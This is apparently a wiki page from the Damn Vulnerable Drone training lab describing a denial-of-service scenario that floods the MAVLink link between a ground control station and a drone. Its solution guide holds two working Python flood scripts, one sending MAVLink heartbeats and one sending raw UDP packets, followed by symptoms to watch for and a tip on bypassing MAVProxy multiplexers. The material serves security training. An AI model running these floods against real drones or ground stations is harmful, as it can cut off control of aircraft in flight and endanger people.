<i>Flooding the MAVLink communication channel to overload the Ground Control Station (GCS) or flight controller.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Denial of Service > Communication Link Flooding

# Description

Communication link flooding involves overwhelming the MAVLink channel between the Ground Control Station (GCS) and the drone's flight controller by sending a high rate of spoofed or junk MAVLink messages. This can result in telemetry drops, laggy control, or even the drone failing to respond to legitimate commands.

This attack can be performed in both WiFi and non-WiFi modes, depending on how the GCS is connected (e.g., direct UDP, TCP, or via a telemetry bridge like MAVProxy or MAVProxy-Docker).

# Resources

- *Coming soon*

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Approach 1: MAVLink Message Flood (WiFi or Bridge Mode)</h3>

<p>This approach sends a high frequency of benign MAVLink messages such as <code>HEARTBEAT</code>, <code>PING</code>, or even malformed messages to flood the receiver's processing thread.</p>

<pre><code class="code mb-3 mt-3"># flood_mavlink_link.py

from pymavlink import mavutil
import time
import sys

def flood_mavlink(target_ip, target_port, rate_hz):
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1

    sock = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
    sock.wait_heartbeat()
    print(f"Connected. Starting flood at {rate_hz} messages/sec...")

    interval = 1 / rate_hz
    while True:
        msg = mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_GENERIC,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
            base_mode=0,
            custom_mode=0,
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        )
        sock.mav.send(msg)
        print("[+] Flooding heartbeat")
        time.sleep(interval)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python flood_mavlink_link.py &lt;ip:port&gt; &lt;rate_hz&gt;")
        sys.exit(1)

    ip, port = sys.argv[1].split(":")
    flood_mavlink(ip, int(port), float(sys.argv[2]))
</code></pre>

---

<h3>Approach 2: UDP Flood (Non-WiFi Mode)</h3>

<p>Flood the UDP telemetry port (e.g., 14550, 14580) using generic UDP packets from a spoofed or connected interface.</p>

<pre><code class="code mb-3 mt-3"># udp_raw_flood.py

import socket
import time
import sys

def flood_udp(ip, port, size=1024, interval=0.001):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"A" * size

    print(f"Flooding {ip}:{port} with {size}-byte packets every {interval}s...")
    while True:
        sock.sendto(payload, (ip, port))
        time.sleep(interval)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python udp_raw_flood.py &lt;ip&gt; &lt;port&gt;")
        sys.exit(1)

    flood_udp(sys.argv[1], int(sys.argv[2]))
</code></pre>

---

<h3>Monitoring Effects</h3>

Watch the Ground Control Station (QGroundControl or MAVProxy) for the following symptoms:

- Telemetry lag or packet loss  
- Dropped MAVLink message warnings  
- GCS lock-ups or UI stutters  
- "Link lost" or timeout events

---

<h3>Defense Notes</h3>

While ArduPilot and PX4 may drop invalid MAVLink packets, they still consume CPU and memory to parse or discard them. Continuous floods may fill internal buffers, causing real packets to be dropped or triggering failsafes (e.g., data link lost).

You may want to combine this with **channel-specific spoofing** (e.g., on TCP vs UDP) to bypass MAVProxy multiplexers.

</details>
